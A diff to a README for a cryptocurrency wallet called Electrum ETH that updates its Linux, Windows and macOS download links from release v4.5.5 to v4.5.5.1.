@@ -24,9 +24,9 @@ Electrum ETH is a lightweight wallet for the Ethereum cryptocurrency that provid
 
 You can download Electrum ETH 4.5.5 for your operating system using the following links:
 
-- **Linux**: [Download AppImage](https://github.com/Electrum-Ethereum/electrum-eth/releases/download/v4.5.5/Linux-electrum-eth.AppImage)
-- **Windows**: [Download EXE](https://github.com/Electrum-Ethereum/electrum-eth/releases/download/v4.5.5/Windows-electrum-eth.exe)
-- **MacOS**: [Download DMG](https://github.com/Electrum-Ethereum/electrum-eth/releases/download/v4.5.5/MacOS-electrum-eth.dmg)
+- **Linux**: [Download AppImage](https://github.com/Electrum-Ethereum/electrum-eth/releases/download/v4.5.5.1/Linux-electrum-eth.AppImage)
+- **Windows**: [Download EXE](https://github.com/Electrum-Ethereum/electrum-eth/releases/download/v4.5.5.1/Windows-electrum-eth.exe)
+- **MacOS**: [Download DMG](https://github.com/Electrum-Ethereum/electrum-eth/releases/download/v4.5.5.1/MacOS-electrum-eth.dmg)
 
 ## 🛠️ Installation
 
